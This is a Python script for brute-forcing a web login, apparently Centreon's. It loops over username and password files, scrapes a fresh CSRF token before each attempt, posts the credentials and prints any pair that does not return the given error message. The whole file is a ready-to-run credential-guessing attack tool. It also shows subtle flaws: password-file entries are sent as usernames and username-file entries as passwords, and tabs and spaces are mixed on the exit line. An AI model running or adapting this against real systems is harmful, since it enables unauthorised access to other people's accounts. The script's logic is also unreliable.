#!/usr/bin/env python
import sys
import requests
import warnings
from bs4 import BeautifulSoup

#the 2 following import is for https, comment for http brute-force
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# turn off BeautifulSoup warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

if len(sys.argv) != 5:
    print(len(sys.argv))
    print("[~] Usage : ./csrf-brute-force.py url usernames_file passwords_file errorMessage")
    exit()


url = sys.argv[1]
usernames = sys.argv[2]
passwords = sys.argv[3]
errorMessage = sys.argv[4]


with open(passwords) as f1:
	for line1 in f1:
		with open(usernames) as f2:
			for line2 in f2:
				request = requests.session()
				print("[+] Retrieving CSRF token to submit the login form")

				page = request.get(url)
				html_content = page.text
				soup = BeautifulSoup(html_content)
				token = soup.findAll('input')[3].get("value")

				print("testing "+line1.rstrip()+":"+ line2.rstrip())

				login_info = {
				    "useralias": line1.rstrip(),
				    "password": line2.rstrip(),
				    "submitLogin": "Connect",
				    "centreon_token": token
				}

				login_request = request.post(url, login_info)
				print("[+] Login token is : {0}".format(token))

				if errorMessage in login_request.text:
					print("[-] Wrong credentials")
				else:
					print("[+] Logged In Sucessfully with "+line1.rstrip()+":"+line2.rstrip())
    				raise sys.exit()
